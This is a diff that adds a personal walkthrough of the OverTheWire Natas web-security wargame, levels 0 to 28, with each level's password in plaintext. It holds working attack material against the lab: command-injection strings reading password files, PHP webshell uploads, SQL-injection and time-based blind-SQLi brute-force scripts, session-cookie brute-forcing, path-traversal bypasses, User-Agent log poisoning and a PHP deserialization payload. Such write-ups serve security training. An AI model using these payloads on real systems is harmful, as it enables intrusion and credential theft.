@@ -1,0 +1,1157 @@
+Level 0 - view page source
+
+<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+
+Level 1 - view page source by ctrl + u
+<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
+
+Level 2 - view source
+check for /files/pixel.png
+browse to /files
+users.txt -- natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+Level3 - ** --- robots.txt for hidden directories (always check)
+browse to /s3cr3t/users.txt
+natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+
+Level4 - it says access disallowed and only allowed from natas5....
+so we need to make to request from natas5....
+to get the access granted so we use "Referer" HTTP header to get the access
+launch burp and change referer header.
+
+A referer header contains to address of the page making request.
+The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+
+
+Level5 - the site says we have to be logged in
+turn on the intercept to check if there is any param for user to login or any cookie to see if logged in
+
+we see there is a cookie : loggedin as 0
+change to value other than 0 we will be logged in.
+
+natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+
+
+Level6 - view source of the webpage
+if can see a php include statement to "includes/secret.inc"
+browse to that web page and view source
+
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+
+submit the secret to get natas7 password
+
+natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
+
+
+
+Level 7 - open the webpage and click on home. Notice that a param page is used to read the file.
+similarly for about also. Now view the source. in hint copy the path given and paste it in page param of url
+
+
+a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+
+
+Level 8 -
+ $encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+
+notice the above code
+we can see that encodedSecret is used in param of encodeSecret() if we can decode the encodedSecret,
+we use this decoded string as input to get natas9 password.
+
+hex2bin(3d3d516343746d4d6d6c315669563362) = ==QcCtmMml1ViV3b
+strrev(==QcCtmMml1ViV3b) = b3ViV1lmMmtCcQ==
+base64_decode(b3ViV1lmMmtCcQ==) = oubWYf2kBq
+
+oubWYf2kBq as input
+
+ Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+
+Level 9 - passthru() is same as exec() in php
+we can use command line injection by using another command by ";"
+we find anything related to "natas"
+;find / -name *natas*;
+
+here *natas* represents anything before and after natas
+
+similarly we can use ,
+
+;find / | grep natas 2> /dev/null;
+password is in etc/natas_webpass **found from a writeup
+
+we have to find natas10 pass. The commnad is
+
+;cat /etc/natas_webpass/natas10;
+
+D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+
+
+Level 10 - here the source code has some input filters.
+we use -v flag of grep to invert match and cat the password of natas11
+
+ 
+U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+/[;|&]/
+if the input contains ; or(|) & it prints illegal character.
+
+alternate method
+
+. cat /etc/natas_webpass/natas11
+
+1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+
+
+
+Level 11 - 
+
+
+**
+	plaintext xor key = ciphertext
+	plaintext xor plaintext xor key = ciphertext xor plaintext
+	key = ciphertext xor plaintext
+**
+
+
+document.cookie = ciphertext --> base64 decode
+source code == dafaultdata -> encode in json (plaintext)
+key = ciphertext xor plaintext
+
+
+
+<?php
+$cipher = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw");
+
+function xor_encrypt($in) {
+    $plaintext = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
+    $text = $in;
+    $outText = '';
+
+    // Iterate through each character
+    for($i=0;$i<strlen($text);$i++) {
+    $outText .= $text[$i] ^ $plaintext[$i % strlen($key)];
+    }
+
+    return $outText;
+}
+
+print xor_encrypt($cipher);
+?>
+
+
+key = qw8J
+
+
+now showpassword is set to false but we need to set it to true
+
+plaintext = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"))
+
+key = qw8J
+
+now ciphertext = plaintext xor key
+
+also we need to encode to base64
+
+base64_encode(ciphertext)
+
+ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
+
+
+change the cookie value using 
+
+	document.cookie = "data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"
+
+click on set color
+
+The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+
+Level12: 
+
+The site contains a file upload
+
+When we upload a file the file is uploaded in "/upload/randomstring.jpg"
+
+The .jpg extension is given in the hidden form input field
+
+We will try to upload a php script 
+
+write a php script and save it
+
+turn on the intercept and upload the file
+
+While the intercept is on change the file name to .php
+
+Forward the request
+
+Now open the php script on the server
+
+We see the php script executed
+
+We need to find the password for natas13 which is stored in "/etc/natas_webpass/".
+
+We have to cat the contents of natas13 in that directory
+
+Inorder to do that, we use shell_exec("string") in the php uploaded file
+
+<?php
+	echo shell_exec("cat /etc/nats_webpass/natas13");
+?>
+
+Open the uploaded php file in the server
+
+The password for natas13 is lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
+
+
+Level 13:
+
+In this level we cannot change the file format turning the intercept on.
+Instead we use file header.
+A file header is used to specify the type of file format.
+We change the file header to jpeg/jpg but save it as php file.
+The following python script can be used to include the jpeg file header.
+
+fh = open('onlypng.php', 'w')
+fh.write('\xFF\xD8\xFF\xE0' + '<?php echo shell_exec('cat echo /etc/web_pass/'); ?>')
+fh.close()
+
+\x specifies "HEX" and \xFF\xD8\xFF\xE0 specifies the file header.
+
+now upload the file in .php format 
+
+intercept the request and change the file format from jpg to php
+
+The password for natas14 is: qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP
+
+
+
+Level 14: 
+
+
+View the source
+Notice the query
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
+
+Let us see if we can break through the username with sqli
+
+
+username = \"".$_REQUEST["username"]."\"
+
+
+username = " "$_REQUEST["username"]" "
+username = " "natas15" "
+username = " "natas15"" OR 1=1" "
+
+we use natas15" OR 1=1--"
+
+" is to break through the first inner quote due to this an addition quote is created
+
+we use OR 1=1 to match any condition for the password which is always true
+
+-- is an sqli comment
+
+" to end the additional quote
+
+sqli command ->  natas15" OR 1=1--"
+
+Successful login! The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
+
+
+
+
+Level 15:
+
+#!/bin/python
+import requests
+from string import *
+
+url = "http://natas15.natas.labs.overthewire.org/index.php"
+username = "natas15"
+password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
+exists_str = "This user exists."
+passchar = []
+characters = lowercase + uppercase + digits
+session = requests.Session()
+
+while True:
+	for ch in characters:
+		inp = {"username": 'natas16" and password like BINARY "' + "".join(passchar) + ch + '%"#'}
+		print("Trying sequence: ", "".join(passchar) + ch)
+		x = requests.post(url, data = inp, auth = (username, password))
+		if (exists_str in x.text):
+			passchar.append(ch)
+			break
+
+
+we iterate for 32 chars
+The password for natas16 is: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+
+
+
+
+Level 16:
+
+This level is same as level 10, but we are given some filters
+    if(preg_match('/[;|&`\'"]/',$key)) 
+So, we need to execute the command in the quotes.
+We have a substitute command i.e, $() which exceutes the command given in the parenthesis
+
+"grep -i \"$key\" dictionary.txt"
+
+
+"$key"
+
+Let us first give a word say, August it prints all the words from dictionay.txt having august as case-insensitive
+
+What if we give a grep command to find a letter in /etc/natas_webpass/natas17/ and if found it returns the whole string into the outer grep command which results no output
+
+We can tell the start of the string with ^ character
+
+We bruteforce character by character and add it to the natas17 password (which does not have August as output in the response)
+
+The length of the password is 32.
+
+The python code for bruteforcing is:
+
+#! /bin/python
+import requests
+from string import *
+
+
+url = "http://natas16.natas.labs.overthewire.org"
+username = "natas16"
+password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
+
+passchar = lowercase + uppercase + digits
+
+
+session = requests.Session()
+
+
+secret = ""
+
+while (len(secret) < 32):
+	for char in passchar:
+		print("Trying sequence: ", secret + char)
+		print('$(grep ^' + secret+char + ' /etc/natas_webpass/natas17)August')
+		response = session.post(url, auth = (username, password), data = {"needle" : '$(grep ^' + secret+char + ' /etc/natas_webpass/natas17)August'}) 
+		content = response.text
+		#print(content)
+
+		#print("\n\n\n\n\n\n")
+		if ("August" not in content):
+			secret = secret + char
+			break
+
+print(secret)
+
+The password for natas17 is: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
+
+
+
+Level 17:
+In this page we have sql injection but does not provide any output of the query
+For this, we use "GET" method and append the input fields to the url also append &debug to get the query displayed
+
+***Also for these type of queries which does not give any ouput we use sleep() function in the sql command to delay the response***
+
+So, our query becomes
+	
+	natas18" and password like 'a%' and sleep(5)#
+
+	URL encoding:
+		natas18"+and+password+like+'x%25'+and+sleep(5)+%23&debug
+
+	whole url:
+		http://natas17.natas.labs.overthewire.org/index.php?username=natas18%22+and+password+like+%27x%25%27+and+sleep(5)+%23&debug
+
+Now there are two types of responses,
+	if the password starts with a% then there is a delay in response
+	else, the response is fast.
+
+To get the reponse time in python: 
+	print(response.elapsed.seconds)
+
+
+
+#! /bin/python
+import requests
+from string import *
+
+username = "natas17"
+password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
+
+url = "http://natas17.natas.labs.overthewire.org/index.php?"
+
+secret = ""
+passchar = lowercase + uppercase + digits
+
+session = requests.Session()
+
+while len(secret) < 32:
+	for char in passchar:
+		print("Trying sequence:", secret + char)
+		params = 'username=natas18"+and+password+like+binary+\'{}%25\'+and+sleep(2)+%23&debug'.format(secret+char)
+		#print(url + params)
+		res = session.get(url + params, auth = (username, password))
+		#print(res.text)
+		if (res.elapsed.seconds >= 2):
+			secret = secret + char
+			break
+
+print(secret)
+
+
+The password for natas18 is: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
+
+
+Level 18:
+	In this level the admin user is checked upon the value of the cookie.
+	The max cookie value is 640.(In source code)
+	A random cookie is generated every time we submit the form.
+	Upon intercepting a request, the cookie is:
+		Cookie: PHPSESSID=386
+	We will bruteforce the PHPSESSID from 0 to 640
+
+
+#! /bin/python
+
+import requests
+
+url = "http://natas18.natas.labs.overthewire.org/index.php"
+#cookie = {"PHPSESSID": "386"}
+data = {"username": "", "password": ""}
+username = "natas18"
+password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
+str_exists = "You are an admin. The credentials for the next level are:"
+
+for i in range(641):
+	print("Trying with cookie as:", i)
+	res = requests.post(url, auth = (username, password) , data = data, cookies = {"PHPSESSID": str(i)})
+	if (str_exists in res.text):
+		print(res.text)
+		print("Cookie:", i)
+		break
+
+
+The password for natas19 is: 8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s
+
+
+Level 19:
+	The site contains the PHPSESSID in the form of: 3336332d61646d696e
+	Let us break down this cookie 333633  2d  61646d696e (Close and open the site once again to get similar cookie.Also, give input as admin)
+	61646d696e only consists of hex digits lets decode it and it says "admin"(if input is given as admin)
+	now let us see if we can try to decode the whole cookie as hexdecode.
+	3336332d61646d696e --> 363-admin
+	We just need to brute force the 363 part i.e hex(333633)
+
+	If we need to brute force we need to encode the digits of range(100, 1000)
+
+
+#! /bin/python
+
+import requests
+
+url = "http://natas19.natas.labs.overthewire.org/index.php"
+username = "natas19"
+password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
+data = {"username": "", "password": ""}
+str_not_exists = "regular user"
+
+for i in  range(100,1000):
+	print("Trying sequence:", i)
+	cookie = str(i).encode("hex") + "2d61646d696e"
+	response = requests.post(url, auth=(username, password), data=data, cookies={"PHPSESSID": cookie})
+	if (str_not_exists not in response.text):
+		print(response.text)
+		print("Cookie:", cookie)
+		print(cookie.decode("hex"))
+		break
+
+
+The password for natas20 is: guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH
+
+
+
+Level 20:
+
+
+The source code creates a session variable.To get the credentials of natas21, the session variable "admin" should have the value of "1"
+A file is created of the name of PHPSESSID
+The content given is put in that file
+
+The explode() funtion is used to split strings based on a sepeator
+
+ foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }  
+
+In the code above, the contents are added into the file as key value pair
+
+
+foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    } 
+
+In this code, the code checks the file data line by line and also splits the data of a line " " as a seperator.
+
+if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>"; 
+
+If we see the first line of this code the session variable should have a value of 1.
+This is compared from the file which is created when a session is created and data is added to the file upon input.
+So, the input should be a new line ("\n") followed by key value pair i.e, (admin 1)
+
+This should be added into the file upon sending the request.
+Turn on the intercept and change the name param to %0Aadmin+1 and send the request.
+
+where %0A is new line (url encoded)
+admin+1 is admin 1 (appended to the file).
+
+name=%0Aadmin+1
+
+
+Even though we send the request the don't see the credentials because the application add data to file for the first request and for the second request it reads data from the first request and adds data the to file from the this(second) request.
+
+We can now see the credentials
+
+The password for natas21 is: 89OWrTkGmiLZLv12JY4tLj2c4FW0xn56
+
+
+
+
+
+---- done till here
+
+
+
+
+
+Level 21:
+
+	The main website is linked with another website and they both share the same session variables.
+
+	if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)
+
+	The main website checks if the session exists and checks for admin in session array also if the admin variable has the value set to 1
+
+
+	if(array_key_exists("submit", $_REQUEST)) {
+    foreach($_REQUEST as $key => $val) {
+    $_SESSION[$key] = $val;
+    } 
+
+
+    The above code from the experimenter page checks if there is a submit value in the POST request.
+    If it exists then add other params into the session variable.
+
+    We can add a param "admin" and its value set to "1" in the request.
+    
+    align=center&fontsize=100%25&bgcolor=yellow&admin=1&submit=Update
+
+    Send the request to the experimenter page.
+
+    Since both the websites share the same session variables replace the main page PHPSESSID with the experimenter PHPSESSID.
+
+    The password for natas22: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+
+
+
+Level 22:
+	Upon viewing the source code of the page, we see
+
+
+if(array_key_exists("revelio", $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
+    header("Location: /");
+    }
+} 
+
+
+The get request should contain revelio to get the password
+?revelio=1
+
+If we do it in burp we can see a 302 response redirect to "/"
+
+But we can see it the response of the request
+
+If we do it in the url, we will simply get redirected to the main page
+
+The password for natas23 is: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
+
+
+Level 23:
+
+
+	The source code of the page is: 
+		if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 ))
+
+Inorder to get the password we need to satisfy both the conditions
+
+strstr() is used to find a substring from input in "iloveyou" and returns true if it contains the substring
+
+"""   
+$_REQUEST["passwd"] > 10
+
+HERE STRING IS CONVERTED TO INTEGER
+In PHP, if the string starts with a valid numeric data the value will be used.Otherwise, the value will be zero.
+Since it should be greater than 10 
+The input should follow:
+	1. A number greater than 10
+	2. "iloveyou"
+
+
+The input is: 100iloveyou
+
+The password for natas24 is: OsRmXFguozKpTZZ5X14zNO43379LZveg
+
+
+Level 24:
+
+	if(!strcmp($_REQUEST["passwd"],"<censored>"))
+
+strcmp is used to compare two strings. If both the strings are equal it returns zero.
+If we make the passwd var an empty string then the strcmp would return 0 meaning the strings are equal.
+
+param:
+	?passwd[]=""
+
+url: http://natas24.natas.labs.overthewire.org/?passwd[]=%22%22
+
+
+The password for natas25 is: GHF6X7YwACaYYssHVY05cFq83hRktl4c
+
+Level 25:
+	This webpage opens a file which is either in english or german and is shown upon user request.
+	In the source code we can see that directory travels checking is done and also we cannot use natas_webpass in the request.
+
+
+	$filename=str_replace("../","",$filename);
+
+	"""
+		We can bypass the directory traversal by using "..././" using this the inner "../" is replaced by "" and we are left with "../"
+	"""
+
+	we can go back to the root by randomly giving some number of ..././
+	Try giving 5 of the ..././
+
+
+We can show the contents of the log file by:
+	http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././var/www/natas/natas25/logs/natas25_eick95t7h6ngouo97peqno9444.log
+
+natas25_eick95t7h6ngouo97peqno9444 is the PHPSESSID
+
+
+function logRequest($message)
+{
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n"; 
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+}
+
+
+The contents of the file are read from this file. The log file contains the HTTP Server Header.
+We can get the password of natas26 by injecting php code into the HTTP_USER_AGENT header.
+Change the header to this: 
+
+User-Agent: <? echo file_get_contents("/etc/natas_webpass/natas26"); ?>
+
+
+User-Agent: <? echo shell_exec("cat /etc/natas_webpass/natas26"); ?>
+
+The password for natas26 is: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+
+
+
+Level 26:
+	The source code stores the from data i.e x1, x2, y1, y2 in the form of an array and stores it in a log file which is from a method from the class Logger.
+	It serializes the object and object, base64 encodes, url encode this array to a cookie named "drawing".
+
+	Source code which can be exploited:
+
+
+	function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+      
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }
+
+
+
+    The initMsg or exitMsg can be manipulated to retrieve contents using php script. We can create a new php file with the following code:
+
+
+
+<?php
+class Logger
+{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+      
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="";
+            $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27');?>";
+            $this->logFile = "img/logger.php";
+      
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }                       
+      
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }                       
+      
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }                       
+}
+
+
+$x = new Logger("");
+echo urlencode(base64_encode(serialize($x)));
+
+?>
+
+
+Now run this script to get the drawing cookie :  Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL2xvZ2dlci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czowOiIiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MToiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTs%2FPiI7fQ%3D%3D
+
+Turn on the intercept and replace the cookie with this cookie.
+
+
+Now, browse the url: 
+	http://natas26.natas.labs.overthewire.org/img/logger.php
+
+	Note that the img directory already exists so we create a file inside that directory.
+
+The password for natas27: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+
+
+
+Level 27:
+ 	The web page asks for a username and password. If the user doesnt exists, a user is created.
+ 	All the special characters are escaped from the input using htmlentities() and mysql_real_escape_string() functions.
+
+
+ 	***
+ 		There is a vulnerability in msql which truncates the "spaces" when the input exceeds the size of varchar.
+
+
+ 		Example
+
+ 			create table "users"(name varchar(10))
+
+ 			insert into table "users" values("natas28")
+
+
+ 			Select * from table "users" where name = "natas28   anything"
+
+ 			The above query will result in "natas28" because the size of varchar is 10 but the input is more than 10 so, it truncates the input field to "natas28"
+
+ 	***
+
+
+ 	In the source code the size of varchar is "64" and length of "natas28" is "7"
+
+ 	The input should exceed more than 64 so, 64 - 7 = "57" spaces should be given and append anything after those spaces.(Give any password)
+
+ 	For the first request it says the user "natas28 with spaces anything" is created.
+ 	
+ 	Send the same request to the the credentials of natas28.
+
+The password for natas28 is: JWwR438wkgTsNKBbcJoowyysdM82YjeF
+
+
+
+Level 28:
+	
+	The webpage shows some jokes from the database upon the input
+
+	"The double quotes and single quotes are escaped"
+
+
+	We can see that the request is redirected to "search.php" with a GET param "query"
+
+	With input as "A", lets url-decode and base64-decode this.
+
+	G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPKjd8MKDZZIiKG51FNeoPjUvfoQVOxoUVz5bypVRFkZR5BPSyq%2FLC12hqpypTFRyXA%3D
+
+	.è%.§º[ýW..ïFmµ.Ü.r.Üø..u..§Ç\.ò£wÃ
+
+	.H.¡¹ÔS^ øÔ½ú.TìhQ\ùo*UDY.G.OK*¿,-v.ªr¥1QÉp
+
+	The output is not understandable.
+
+	Lets change the query param as anything say "A". So this becomes 
+			http://natas28.natas.labs.overthewire.org/search.php/?query=A
+
+	We get  Incorrect amount of PKCS#7 padding for blocksize
+
+	Here PKCS is Public Key Cryptography Standards meaning we are dealing with a block cipher encryption.
+
+	A block cipher takes a block of plaintext bits and generates a block of ciphertext bits, generally of same size.
+
+	****************
+	Generally when dealing with a block cipher we need to consider few things:
+
+		size of the block
+		offset of the input (determine where is our input)
+
+	****************
+
+	To determine the size of the block we will send out input with length ranging from 1-50 of "A's" and determine the length of the query param.
+
+	Determine the length of query param:
+
+			import requests
+			import base64
+
+
+			username = "natas28"
+			password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"
+			url = "http://natas28.natas.labs.overthewire.org"
+
+			query = "A"
+
+
+
+			for i in range(1, 50):
+			    res = requests.post(url, auth = (username, password), data= {"query": query * i})
+
+			    x = res.url.split("=")[1]
+
+			    #print(base64.b64decode(requests.utils.unquote(x)))
+			    print(str(len(requests.utils.unquote(x))) + " query length: " + str(i))
+
+	Output:
+		Response length: 108 query length: 1
+		Response length: 108 query length: 2
+		Response length: 108 query length: 3
+		Response length: 108 query length: 4
+		Response length: 108 query length: 5
+		Response length: 108 query length: 6
+		Response length: 108 query length: 7
+		Response length: 108 query length: 8
+		Response length: 108 query length: 9
+		Response length: 108 query length: 10
+		Response length: 108 query length: 11
+		Response length: 108 query length: 12
+		Response length: 128 query length: 13
+		Response length: 128 query length: 14
+		Response length: 128 query length: 15
+		Response length: 128 query length: 16
+		Response length: 128 query length: 17
+		Response length: 128 query length: 18
+		Response length: 128 query length: 19
+		Response length: 128 query length: 20
+		Response length: 128 query length: 21
+		Response length: 128 query length: 22
+		Response length: 128 query length: 23
+		Response length: 128 query length: 24
+		Response length: 128 query length: 25
+		Response length: 128 query length: 26
+		Response length: 128 query length: 27
+		Response length: 128 query length: 28
+		Response length: 152 query length: 29
+		Response length: 152 query length: 30
+		Response length: 152 query length: 31
+		Response length: 152 query length: 32
+		Response length: 152 query length: 33
+		Response length: 152 query length: 34
+		Response length: 152 query length: 35
+		Response length: 152 query length: 36
+		Response length: 152 query length: 37
+		Response length: 152 query length: 38
+		Response length: 152 query length: 39
+		Response length: 152 query length: 40
+		Response length: 152 query length: 41
+		Response length: 152 query length: 42
+		Response length: 152 query length: 43
+		Response length: 152 query length: 44
+		Response length: 172 query length: 45
+		Response length: 172 query length: 46
+		Response length: 172 query length: 47
+		Response length: 172 query length: 48
+		Response length: 172 query length: 49
+
+
+	We can the response length increases on 13, 29, 45
+
+	"The difference between 29 and 13 is 16 (from our response length) meaning that the block size is 16"
+
+	Lets gather some of the query param of input length[1-13]
+
+	Input length 1 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data a377c30a0d964888a1b9d4535ea0f8d4
+	Block: 4 data bdfa1054ec68515cf96f2a5544591947
+	Block: 5 data 904f4b2abf2c2d7686aa72a53151c970
+	Input length 2 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data 98b0d620b20d6114979b77e24d8b1d3a
+	Block: 4 data 48799a07b1d29b5982015c9355c2e00e
+	Block: 5 data aded9bdbaca6a73b71b35a010d2c4c57
+	Input length 3 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data 7c126a31294d678cab9b9b0efe443b75
+	Block: 4 data 9a2e2b5db6f31f19a14f75678eadaa90
+	Block: 5 data 4249b93e4dea0909479995b9c44b351a
+	Input length 4 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data b4dbdd7cb1035469d6acb2f9520070c7
+	Block: 4 data 29287f3cc5479e12e66f31c863b18047
+	Block: 5 data 56d5732dc8c770f64397158bc17a6e66
+	Input length 5 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data 4b934c5d11aac887e32f4e457ad5396f
+	Block: 4 data ac3b871c1c448386b45cd36d9e8f72f4
+	Block: 5 data 655149bbba2123d89d95417ea27f3a7b
+	Input length 6 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data 7e0d979d48942ac2b657f6d7d418ced6
+	Block: 4 data 41c098c4bacdc5ed9357564e5105dd7e
+	Block: 5 data 64d0dcc868253692adfcbd3796d1bf8a
+	Input length 7 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data afc2628c6140266db680aee2b57a9b88
+	Block: 4 data 6486954aea46fb93e9ab85845b4f4bd0
+	Block: 5 data d7ff2b725453fc294701e51f5d7c0f8e
+	Input length 8 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data cd43a47166c63b50f45ee728b271f522
+	Block: 4 data 896de90884f86108b167f8b4aea5d763
+	Block: 5 data 917232051483e68e458fd066167b30a3
+	Input length 9 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data 8816c61e2bc6372660f879c45f23777e 
+	Block: 4 data a09522f301cf9d36ac7023f165948c5a
+	Block: 5 data 9739cd90522fa7a86f95773b56f9f8c0
+	Input length 10 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data 5f22a727f625419a466f9af53891f9b2
+	Block: 4 data 738a5ffb4a4500246775175ae596bbd6
+	Block: 5 data f34df339c69edce11f6650bbced62702
+	Input length 11 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data 5f22a727f625419a466f9af53891f9b2
+	Block: 4 data 36336947ddff073d132c22391e655108
+	Block: 5 data ca8cf4e610913abae39a067619204a5a
+	Input length 12 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data 5f22a727f625419a466f9af53891f9b2
+	Block: 4 data 87527d43773398c6ef1f114a513a0028
+	Block: 5 data 75fd5044fd063d26f6bb7f734b41c899
+	Input length 13 Response length(hex): 192
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
+	Block: 3 data 5f22a727f625419a466f9af53891f9b2
+	Block: 4 data c6476e419619d387f457731225f15fe1
+	Block: 5 data 6223a14d9c4291b98775b03fbc73d4ed
+	Block: 6 data d8ae51d7da71b2b083d919a0d7b88b98
+
+	As we can see the first 2 block few characters remain the same for any input.
+
+	"This means that some text is prepended and following that we have our input"
+
+	
+
+	We took the difference because a new block is being added if the input is more than 16 bytes i.e, 32 characters.How?
+
+	How do we know that the output is raw bytes?
+
+	 		import requests
+			import base64
+
+
+			username = "natas28"
+			password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"
+			url = "http://natas28.natas.labs.overthewire.org"
+
+			query = "A"
+				
+			res = requests.post(url, auth = (username, password), data= {"query": query * i})
+
+			x = res.url.split("=")[1]
+
+			x = base64.b64decode(requests.utils.unquote(x))
+			
+			"
+			print(isinstance(x, bytes)) evaluates to True
+
+			and also bytes are represented by a prefix b'
+
+			"
+
+	How 16 bytes is 32 hex characters?
+
+	1 byte has 8 bits
+
+	0000  0000
+	F     F
+
+	"The maximum value in hex is F(15) occupies 4 bits, so 2 hex characters(FF) occupy 1 byte"
+
+	Hence, 16 bytes occupy 32 hex characters.
+
+	Notice that the third block also remains same from the query length 10
+
+	Input length 9 Response length(hex): 160
+	=================================================================
+	Block: 1 data 1be82511a7ba5bfd578c0eef466db59c
+	Block: 2 data dc84728fdcf89d93751d10a7c75c8cf2
